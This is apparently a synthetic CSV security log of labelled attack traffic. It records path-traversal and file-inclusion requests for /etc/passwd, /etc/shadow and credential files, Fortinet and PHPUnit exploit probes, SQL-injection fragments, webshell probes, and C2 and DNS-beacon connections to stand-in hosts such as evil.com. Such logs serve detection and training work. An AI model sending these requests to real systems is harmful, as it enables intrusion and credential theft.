timestamp,src_ip,method,uri,status,bytes,user_agent,event_type,country,asn
2026-02-13 00:00:31,94.102.61.45,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,500,1562,"python-requests/2.28.1",phpunit_rce_payload,NL,201593
2026-02-13 00:00:32,45.155.205.233,GET,/owa/auth/logon.aspx,200,45231,"Mozilla/4.0 (compatible; MSIE 10.0)",exchange_scan,NL,207375
2026-02-13 00:00:33,45.155.205.233,POST,/owa/auth.owa,302,423,"Mozilla/4.0",exchange_bruteforce,NL,207375
2026-02-13 00:00:34,45.155.205.233,POST,/ecp/default.flt,302,389,"Mozilla/4.0",ecp_bruteforce,NL,207375
2026-02-13 00:00:35,91.240.118.50,GET,/actuator/gateway/routes,404,298,"Mozilla/5.0",spring_cloud_gateway,UA,42884
2026-02-13 00:00:36,91.240.118.50,POST,/actuator/gateway/refresh,401,267,"Mozilla/5.0",spring_cloud_scan,UA,42884
2026-02-13 00:00:37,185.191.126.1,GET,/remote/fgt_lang?lang=/../../../..////////dev/cmdb/sslvpn_websession,200,78421,"Python/3.9",fortinet_cve_2022_40684,GB,208323
2026-02-13 00:00:38,185.191.126.1,POST,/api/v2/cmdb/system/admin/admin,200,523,"Python/3.9",fortinet_create_admin,GB,208323
2026-02-13 00:00:39,103.145.60.1,GET,/shell?whoami,404,278,"Go-http-client/1.1",webshell_scan,ID,132077
2026-02-13 00:00:40,103.145.60.1,POST,/uploader/upload.jsp,404,281,"Go-http-client/1.1",webshell_upload,ID,132077
2026-02-13 00:00:41,192.168.1.101,CONNECT,https://evil.com:443,200,5123,"-",c2_connection,PRIVATE,-
2026-02-13 00:00:42,192.168.1.101,CONNECT,https://malware.xyz:443,200,4123,"-",c2_connection,PRIVATE,-
2026-02-13 00:00:43,192.168.1.101,DNS,evil.com,0,0,"-",dns_beacon,PRIVATE,-
2026-02-13 00:00:44,10.10.10.5,SMB,admin$,ACCESS_DENIED,0,"-",smb_scan,PRIVATE,-
2026-02-13 00:00:45,10.10.10.5,SMB,IPC$,ACCESS_DENIED,0,"-",smb_scan,PRIVATE,-
2026-02-13 00:00:46,10.10.10.5,SMB,C$,ACCESS_DENIED,0,"-",smb_share_scan,PRIVATE,-
2026-02-13 00:00:47,84.54.43.123,GET,/index.php?page=../../../../etc/passwd,403,523,"Mozilla/5.0",lfi_attempt,BG,207960
2026-02-13 00:00:48,84.54.43.123,GET,/index.php?page=php://filter/convert.base64-encode/resource=config,500,8923,"Mozilla/5.0",lfi_base64,BG,207960
2026-02-13 00:00:49,185.246.153.1,GET,/zabbix/zabbix.php?action=dashboard.view,200,12341,"Zabbix",zabbix_scan,LV,205577
2026-02-13 00:00:50,185.246.153.1,POST,/zabbix/index.php,302,312,"Zabbix",zabbix_bruteforce,LV,205577
2026-02-13 00:00:51,193.32.162.1,GET,/v2/_catalog,200,5678,"docker/20.10.12",docker_registry_scan,DE,205062
2026-02-13 00:00:52,193.32.162.1,GET,/v2/_catalog?n=1000,200,12412,"docker/20.10.12",docker_registry_enum,DE,205062
2026-02-13 00:00:53,217.12.221.1,GET,/console/images/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,404,398,"-",tomcat_path_traversal,UA,207668
2026-02-13 00:00:54,217.12.221.1,GET,/manager/html,401,512,"-",tomcat_manager_scan,UA,207668
2026-02-13 00:00:55,212.113.106.1,POST,/Autodiscover/Autodiscover.xml,200,12873,"ExchangeServicesClient/15.01.2507.020",exchange_autodiscover,DE,208323
2026-02-13 00:00:56,212.113.106.1,POST,/owa/auth.owa,302,423,"ExchangeServicesClient",exchange_auth_bypass,DE,208323
2026-02-13 00:00:57,5.2.77.1,GET,/jenkins/login?from=%2Fjenkins%2Fscript,200,23412,"-",jenkins_script_scan,NL,205915
2026-02-13 00:00:58,5.2.77.1,POST,/jenkins/script,403,512,"-",jenkins_script_attempt,NL,205915
2026-02-13 00:00:59,8.8.8.8,GET,/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB,200,512,"-",doh_abuse,US,15169
2026-02-13 00:01:00,8.8.8.8,GET,/resolve?name=evil.com&type=A,200,234,"-",doh_exfiltration,US,15169
2026-02-13 00:01:01,185.220.101.2,GET,/wp-content/plugins/elementor/readme.txt,200,5123,"Mozilla/5.0",vuln_scan,US,39836
2026-02-13 00:01:02,185.220.101.2,GET,/wp-json/wp/v2/users,200,8921,"Mozilla/5.0",user_enum,US,39836
2026-02-13 00:01:03,185.220.101.2,POST,/wp-admin/admin-ajax.php,200,1562,"Mozilla/5.0",ajax_exploit,US,39836
2026-02-13 00:01:04,89.123.45.68,REGISTER,sip:pbx.company.com,401,411,"-",voip_flood,RO,8708
2026-02-13 00:01:05,89.123.45.68,REGISTER,sip:pbx.company.com,401,412,"-",voip_flood,RO,8708
2026-02-13 00:01:06,89.123.45.68,REGISTER,sip:pbx.company.com,401,410,"-",voip_flood,RO,8708
2026-02-13 00:01:07,45.227.252.231,POST,/xmlrpc.php,200,1891,"WordPress/5.8.3",xmlrpc_attack,SC,268581
2026-02-13 00:01:08,45.227.252.231,POST,/xmlrpc.php,200,1877,"WordPress/5.8.3",xmlrpc_attack,SC,268581
2026-02-13 00:01:09,45.227.252.231,POST,/xmlrpc.php,200,1883,"WordPress/5.8.3",xmlrpc_attack,SC,268581
2026-02-13 00:01:10,192.168.1.101,SSH,invalid_user_test,55435,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:01:11,192.168.1.101,SSH,invalid_user_backup,55436,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:01:12,192.168.1.101,SSH,invalid_user_webmaster,55437,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:01:13,103.86.51.12,GET,/index.php?option=com_content&view=article,200,6542,"Mozilla/4.0",joomla_scan,CN,137443
2026-02-13 00:01:14,103.86.51.12,POST,/index.php?option=com_users&task=registration.register,302,214,"Mozilla/4.0",joomla_registration,CN,137443
2026-02-13 00:01:15,103.86.51.12,GET,/administrator/manifests/files/joomla.xml,200,2341,"Mozilla/4.0",version_disclosure,CN,137443
2026-02-13 00:01:16,5.188.206.201,GET,/.env.backup,404,290,"curl/7.68.0",env_leak,FR,202448
2026-02-13 00:01:17,5.188.206.201,GET,/.git/HEAD,404,292,"curl/7.68.0",git_leak,FR,202448
2026-02-13 00:01:18,5.188.206.201,GET,/.aws/config,404,294,"curl/7.68.0",aws_leak,FR,202448
2026-02-13 00:01:19,172.16.0.11,SYSTEM,postmaster,alert,0,"Queue overflow: mail queue size 15000",mail_queue_crash,PRIVATE,-
2026-02-13 00:01:20,172.16.0.11,SYSTEM,postfix,fatal,0,"fatal: out of memory",mail_service_failure,PRIVATE,-
2026-02-13 00:01:21,2.56.59.145,GET,/cgi-bin/luci/admin/status/realtime/bandwidth,200,15632,"Mozilla/5.0",router_monitor,RU,208628
2026-02-13 00:01:22,2.56.59.145,POST,/cgi-bin/luci/;stok=/admin/system/upgrade,302,192,"Mozilla/5.0",router_firmware_attempt,RU,208628
2026-02-13 00:01:23,2.56.59.145,GET,/cgi-bin/luci/;stok=/admin/network/network,200,34521,"Mozilla/5.0",router_config_leak,RU,208628
2026-02-13 00:01:24,192.168.1.22,GET,/proxy.pac,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:01:25,192.168.1.22,GET,/wpad.dat,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:01:26,192.168.1.22,CONNECT,facebook.com:443,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:01:27,185.176.222.2,GET,/solr/admin/cores?action=CREATE,500,8932,"Apache-HttpClient/4.5.13",solr_rce_attempt,NL,207812
2026-02-13 00:01:28,185.176.222.2,POST,/solr/select?q=1%3D1%20AND%20sleep(5),200,12412,"Apache-HttpClient",solr_time_injection,NL,207812
2026-02-13 00:01:29,185.176.222.2,GET,/solr/admin/java,200,12312,"Apache-HttpClient",solr_java_info,NL,207812
2026-02-13 00:01:30,94.102.61.46,GET,/.well-known/security.txt,404,289,"python-requests/2.28.1",security_scan,NL,201593
2026-02-13 00:01:31,94.102.61.46,GET,/robots.txt,200,523,"python-requests/2.28.1",recon,NL,201593
2026-02-13 00:01:32,45.155.205.234,GET,/owa/auth/logon.aspx?url=/owa/&reason=0,200,45234,"Mozilla/4.0",exchange_scan,NL,207375
2026-02-13 00:01:33,45.155.205.234,POST,/ecp/ECPProxy.aspx,302,412,"Mozilla/4.0",ecp_proxy_attempt,NL,207375
2026-02-13 00:01:34,45.155.205.234,POST,/PowerShell,401,234,"Mozilla/4.0",powershell_remoting,NL,207375
2026-02-13 00:01:35,91.240.118.51,GET,/actuator/health,200,1234,"Mozilla/5.0",spring_actuator,UA,42884
2026-02-13 00:01:36,91.240.118.51,GET,/actuator/env,401,267,"Mozilla/5.0",spring_env_scan,UA,42884
2026-02-13 00:01:37,185.191.126.2,GET,/remote/fgt_lang?lang=/../../../..////////dev/cmdb/system/status,200,23412,"Python/3.9",fortinet_status,GB,208323
2026-02-13 00:01:38,185.191.126.2,POST,/api/v2/cmdb/system/admin,200,512,"Python/3.9",fortinet_admin_enum,GB,208323
2026-02-13 00:01:39,103.145.60.2,GET,/shell.php,404,279,"Go-http-client/1.1",webshell_scan,ID,132077
2026-02-13 00:01:40,103.145.60.2,POST,/c99.php,404,282,"Go-http-client/1.1",webshell_upload,ID,132077
2026-02-13 00:01:41,192.168.1.102,CONNECT,https://c2server.xyz:443,200,5124,"-",c2_connection,PRIVATE,-
2026-02-13 00:01:42,192.168.1.102,CONNECT,https://botnet.cc:443,200,4124,"-",c2_connection,PRIVATE,-
2026-02-13 00:01:43,192.168.1.102,DNS,update.attacker.com,0,0,"-",dns_beacon,PRIVATE,-
2026-02-13 00:01:44,10.10.10.6,SMB,ADMIN$,ACCESS_DENIED,0,"-",smb_scan,PRIVATE,-
2026-02-13 00:01:45,10.10.10.6,SMB,NETLOGON,ACCESS_DENIED,0,"-",smb_scan,PRIVATE,-
2026-02-13 00:01:46,10.10.10.6,SMB,SYSVOL,ACCESS_DENIED,0,"-",smb_share_scan,PRIVATE,-
2026-02-13 00:01:47,84.54.43.124,GET,/index.php?page=../../../../windows/win.ini,200,1231,"Mozilla/5.0",lfi_windows,BG,207960
2026-02-13 00:01:48,84.54.43.124,GET,/index.php?page=php://filter/read=convert.base64-encode/resource=db_connect,500,8912,"Mozilla/5.0",lfi_db_creds,BG,207960
2026-02-13 00:01:49,185.246.153.2,GET,/zabbix/chart.php?period=3600,200,8923,"Zabbix",zabbix_monitor,LV,205577
2026-02-13 00:01:50,185.246.153.2,POST,/zabbix/index.php,302,313,"Zabbix",zabbix_bruteforce,LV,205577
2026-02-13 00:01:51,193.32.162.2,GET,/v2/_catalog?n=5000,200,23412,"docker/20.10.12",docker_registry_enum,DE,205062
2026-02-13 00:01:52,193.32.162.2,GET,/v2/nginx/manifests/latest,200,18923,"docker/20.10.12",docker_pull_attempt,DE,205062
2026-02-13 00:01:53,217.12.221.2,GET,/console/images/..%252f..%252f..%252f..%252f..%252fvar%252flog%252ftomcat%252fcatalina.out,404,412,"-",tomcat_log_leak,UA,207668
2026-02-13 00:01:54,217.12.221.2,GET,/manager/status,401,523,"-",tomcat_manager_status,UA,207668
2026-02-13 00:01:55,212.113.106.2,POST,/Autodiscover/Autodiscover.xml,200,12874,"ExchangeServicesClient/15.02.0921.012",exchange_autodiscover,DE,208323
2026-02-13 00:01:56,212.113.106.2,POST,/owa/auth.owa,302,424,"ExchangeServicesClient",exchange_auth_bypass,DE,208323
2026-02-13 00:01:57,5.2.77.2,GET,/jenkins/scriptler,200,8923,"-",jenkins_scriptler_scan,NL,205915
2026-02-13 00:01:58,5.2.77.2,POST,/jenkins/scriptler/runScript,403,523,"-",jenkins_scriptler_attempt,NL,205915
2026-02-13 00:01:59,1.1.1.1,GET,/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlM2NvbQAAAQAB,200,523,"-",doh_abuse,US,13335
2026-02-13 00:02:00,1.1.1.1,GET,/resolve?name=malware.net&type=A,200,235,"-",doh_exfiltration,US,13335
2026-02-13 00:02:01,185.220.101.3,GET,/wp-content/plugins/akismet/readme.txt,200,4123,"Mozilla/5.0",vuln_scan,US,39836
2026-02-13 00:02:02,185.220.101.3,GET,/wp-json/oembed/1.0/embed?url=,200,6234,"Mozilla/5.0",api_scan,US,39836
2026-02-13 00:02:03,185.220.101.3,POST,/wp-admin/admin-ajax.php?action=wp_rest,200,1452,"Mozilla/5.0",rest_api_abuse,US,39836
2026-02-13 00:02:04,89.123.45.69,REGISTER,sip:pbx.company.com,401,413,"-",voip_flood,RO,8708
2026-02-13 00:02:05,89.123.45.69,REGISTER,sip:pbx.company.com,401,411,"-",voip_flood,RO,8708
2026-02-13 00:02:06,89.123.45.69,REGISTER,sip:pbx.company.com,401,410,"-",voip_flood,RO,8708
2026-02-13 00:02:07,45.227.252.232,POST,/xmlrpc.php,200,1893,"WordPress/5.9.3",xmlrpc_attack,SC,268581
2026-02-13 00:02:08,45.227.252.232,POST,/xmlrpc.php,200,1878,"WordPress/5.9.3",xmlrpc_attack,SC,268581
2026-02-13 00:02:09,45.227.252.232,POST,/xmlrpc.php,200,1882,"WordPress/5.9.3",xmlrpc_attack,SC,268581
2026-02-13 00:02:10,192.168.1.102,SSH,invalid_user_ftp,55438,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:02:11,192.168.1.102,SSH,invalid_user_mysql,55439,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:02:12,192.168.1.102,SSH,invalid_user_redis,55440,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:02:13,103.86.51.13,GET,/index.php?option=com_finder&view=search,200,5234,"Mozilla/4.0",joomla_finder,CN,137443
2026-02-13 00:02:14,103.86.51.13,POST,/index.php?option=com_users&task=reset.request,200,1342,"Mozilla/4.0",password_reset_abuse,CN,137443
2026-02-13 00:02:15,103.86.51.13,GET,/administrator/logs/error.php,404,289,"Mozilla/4.0",log_disclosure,CN,137443
2026-02-13 00:02:16,5.188.206.202,GET,/.env.production,404,291,"curl/7.68.0",env_leak,FR,202448
2026-02-13 00:02:17,5.188.206.202,GET,/.git/index,404,293,"curl/7.68.0",git_leak,FR,202448
2026-02-13 00:02:18,5.188.206.202,GET,/.s3cfg,404,295,"curl/7.68.0",s3_leak,FR,202448
2026-02-13 00:02:19,172.16.0.12,SYSTEM,nginx,error,0,"*1024 recv() failed (104: Connection reset by peer)",connection_reset,PRIVATE,-
2026-02-13 00:02:20,172.16.0.12,SYSTEM,nginx,error,0,"*1025 upstream timed out (110: Connection timed out)",upstream_timeout,PRIVATE,-
2026-02-13 00:02:21,2.56.59.146,GET,/cgi-bin/luci/admin/status/processes,200,14523,"Mozilla/5.0",router_proc_scan,RU,208628
2026-02-13 00:02:22,2.56.59.146,POST,/cgi-bin/luci/;stok=/admin/services/ssh,302,193,"Mozilla/5.0",router_ssh_enable,RU,208628
2026-02-13 00:02:23,2.56.59.146,GET,/cgi-bin/luci/;stok=/admin/services/telnet,200,18923,"Mozilla/5.0",router_telnet_check,RU,208628
2026-02-13 00:02:24,192.168.1.23,GET,/network.ps1,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:02:25,192.168.1.23,GET,/autoproxy.pac,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:02:26,192.168.1.23,CONNECT,googleapis.com:443,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:02:27,185.176.222.3,GET,/solr/admin/cores?action=STATUS,200,8934,"Apache-HttpClient/4.5.13",solr_status,NL,207812
2026-02-13 00:02:28,185.176.222.3,POST,/solr/select?q=1%3D1%20UNION%20SELECT,500,12452,"Apache-HttpClient",solr_sqli,NL,207812
2026-02-13 00:02:29,185.176.222.3,GET,/solr/admin/threads,200,8923,"Apache-HttpClient",solr_thread_dump,NL,207812
2026-02-13 00:02:30,94.102.61.47,GET,/.well-known/assetlinks.json,404,290,"python-requests/2.28.1",app_scan,NL,201593
2026-02-13 00:02:31,94.102.61.47,GET,/sitemap.xml,200,1234,"python-requests/2.28.1",recon,NL,201593
2026-02-13 00:02:32,45.155.205.235,GET,/ecp/HealthService.aspx,200,4523,"Mozilla/4.0",exchange_health,NL,207375
2026-02-13 00:02:33,45.155.205.235,POST,/ecp/ECPProxy.aspx,302,413,"Mozilla/4.0",ecp_proxy_attempt,NL,207375
2026-02-13 00:02:34,45.155.205.235,POST,/PowerShell,401,235,"Mozilla/4.0",powershell_remoting,NL,207375
2026-02-13 00:02:35,91.240.118.52,GET,/actuator/mappings,200,18923,"Mozilla/5.0",spring_mappings,UA,42884
2026-02-13 00:02:36,91.240.118.52,GET,/actuator/beans,401,268,"Mozilla/5.0",spring_beans_scan,UA,42884
2026-02-13 00:02:37,185.191.126.3,GET,/remote/fgt_lang?lang=/../../../..////////dev/cmdb/system/admin,200,23413,"Python/3.9",fortinet_admin_list,GB,208323
2026-02-13 00:02:38,185.191.126.3,POST,/api/v2/cmdb/system/admin,200,513,"Python/3.9",fortinet_admin_enum,GB,208323
2026-02-13 00:02:39,103.145.60.3,GET,/r57.php,404,280,"Go-http-client/1.1",webshell_scan,ID,132077
2026-02-13 00:02:40,103.145.60.3,POST,/b374k.php,404,283,"Go-http-client/1.1",webshell_upload,ID,132077
2026-02-13 00:02:41,192.168.1.103,CONNECT,https://c2.pwn:443,200,5125,"-",c2_connection,PRIVATE,-
2026-02-13 00:02:42,192.168.1.103,CONNECT,https://malware.download:443,200,4125,"-",c2_connection,PRIVATE,-
2026-02-13 00:02:43,192.168.1.103,DNS,stage.attacker.com,0,0,"-",dns_beacon,PRIVATE,-
2026-02-13 00:02:44,10.10.10.7,SMB,PRINTER$,ACCESS_DENIED,0,"-",smb_scan,PRIVATE,-
2026-02-13 00:02:45,10.10.10.7,SMB,IPC$,ACCESS_DENIED,0,"-",smb_scan,PRIVATE,-
2026-02-13 00:02:46,10.10.10.7,SMB,ADMIN$,ACCESS_DENIED,0,"-",smb_share_scan,PRIVATE,-
2026-02-13 00:02:47,84.54.43.125,GET,/index.php?page=../../../../etc/passwd%00,403,524,"Mozilla/5.0",lfi_nullbyte,BG,207960
2026-02-13 00:02:48,84.54.43.125,GET,/index.php?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd,500,8932,"Mozilla/5.0",lfi_complex,BG,207960
2026-02-13 00:02:49,185.246.153.3,GET,/zabbix/history.php,200,8924,"Zabbix",zabbix_history,LV,205577
2026-02-13 00:02:50,185.246.153.3,POST,/zabbix/index.php,302,314,"Zabbix",zabbix_bruteforce,LV,205577
2026-02-13 00:02:51,193.32.162.3,GET,/v2/redis/tags/list,200,15623,"docker/20.10.12",docker_tag_enum,DE,205062
2026-02-13 00:02:52,193.32.162.3,GET,/v2/mysql/manifests/latest,200,18924,"docker/20.10.12",docker_pull_attempt,DE,205062
2026-02-13 00:02:53,217.12.221.3,GET,/console/..%252f..%252f..%252f..%252f..%252fetc%252fshadow,404,399,"-",tomcat_shadow_leak,UA,207668
2026-02-13 00:02:54,217.12.221.3,GET,/manager/html/upload,401,524,"-",tomcat_upload_scan,UA,207668
2026-02-13 00:02:55,212.113.106.3,POST,/Autodiscover/Autodiscover.xml,200,12875,"ExchangeServicesClient/15.02.0922.013",exchange_autodiscover,DE,208323
2026-02-13 00:02:56,212.113.106.3,POST,/owa/auth.owa,302,425,"ExchangeServicesClient",exchange_auth_bypass,DE,208323
2026-02-13 00:02:57,5.2.77.3,GET,/jenkins/pluginManager/api/json,200,8924,"-",jenkins_plugin_enum,NL,205915
2026-02-13 00:02:58,5.2.77.3,POST,/jenkins/pluginManager/install,403,524,"-",jenkins_plugin_install,NL,205915
2026-02-13 00:02:59,8.8.4.4,GET,/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlM2NvbQAAAQAB,200,524,"-",doh_abuse,US,15169
2026-02-13 00:03:00,8.8.4.4,GET,/resolve?name=ransomware.org&type=A,200,236,"-",doh_exfiltration,US,15169
2026-02-13 00:03:01,185.220.101.4,GET,/wp-content/plugins/contact-form-7/readme.txt,200,4124,"Mozilla/5.0",vuln_scan,US,39836
2026-02-13 00:03:02,185.220.101.4,GET,/wp-json/wp/v2/posts?per_page=100,200,7234,"Mozilla/5.0",api_scan,US,39836
2026-02-13 00:03:03,185.220.101.4,POST,/wp-admin/admin-ajax.php?action=elementor_ajax,200,1563,"Mozilla/5.0",elementor_abuse,US,39836
2026-02-13 00:03:04,89.123.45.70,REGISTER,sip:pbx.company.com,401,412,"-",voip_flood,RO,8708
2026-02-13 00:03:05,89.123.45.70,REGISTER,sip:pbx.company.com,401,413,"-",voip_flood,RO,8708
2026-02-13 00:03:06,89.123.45.70,REGISTER,sip:pbx.company.com,401,411,"-",voip_flood,RO,8708
2026-02-13 00:03:07,45.227.252.233,POST,/xmlrpc.php,200,1894,"WordPress/6.0.3",xmlrpc_attack,SC,268581
2026-02-13 00:03:08,45.227.252.233,POST,/xmlrpc.php,200,1879,"WordPress/6.0.3",xmlrpc_attack,SC,268581
2026-02-13 00:03:09,45.227.252.233,POST,/xmlrpc.php,200,1881,"WordPress/6.0.3",xmlrpc_attack,SC,268581
2026-02-13 00:03:10,192.168.1.103,SSH,invalid_user_ubuntu,55441,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:03:11,192.168.1.103,SSH,invalid_user_debian,55442,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:03:12,192.168.1.103,SSH,invalid_user_centos,55443,0,"-",ssh_bruteforce,PRIVATE,-
2026-02-13 00:03:13,103.86.51.14,GET,/index.php?option=com_content&view=categories,200,4234,"Mozilla/4.0",joomla_categories,CN,137443
2026-02-13 00:03:14,103.86.51.14,POST,/index.php?option=com_contact&view=contact&id=1,200,1231,"Mozilla/4.0",contact_spam,CN,137443
2026-02-13 00:03:15,103.86.51.14,GET,/administrator/cache/ja_tools_v4/cache.txt,404,290,"Mozilla/4.0",cache_disclosure,CN,137443
2026-02-13 00:03:16,5.188.206.203,GET,/.env.staging,404,292,"curl/7.68.0",env_leak,FR,202448
2026-02-13 00:03:17,5.188.206.203,GET,/.git/logs/HEAD,404,294,"curl/7.68.0",git_log_leak,FR,202448
2026-02-13 00:03:18,5.188.206.203,GET,/.boto,404,296,"curl/7.68.0",aws_creds_leak,FR,202448
2026-02-13 00:03:19,172.16.0.13,SYSTEM,mysql,error,0,"[ERROR] Too many connections",db_connection_overflow,PRIVATE,-
2026-02-13 00:03:20,172.16.0.13,SYSTEM,mysql,error,0,"[ERROR] Aborted connection 1234 to db: 'production' user: 'app' host: '10.0.0.5'",db_abort,PRIVATE,-
2026-02-13 00:03:21,2.56.59.147,GET,/cgi-bin/luci/admin/network/diagnostics,200,16723,"Mozilla/5.0",router_diagnostics,RU,208628
2026-02-13 00:03:22,2.56.59.147,POST,/cgi-bin/luci/;stok=/admin/services/vpn,302,194,"Mozilla/5.0",router_vpn_enable,RU,208628
2026-02-13 00:03:23,2.56.59.147,GET,/cgi-bin/luci/;stok=/admin/system/backup,200,23423,"Mozilla/5.0",router_backup_attempt,RU,208628
2026-02-13 00:03:24,192.168.1.24,GET,/proxy_auto.pac,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:03:25,192.168.1.24,GET,/wpad.ps1,401,0,"-",proxy_anon_auth,PRIVATE,-
2026-02-13 00:03:26,192.168.1.24,CONNECT,github.com:443,401,0,"-",proxy_anon_auth,PRIVATE,-
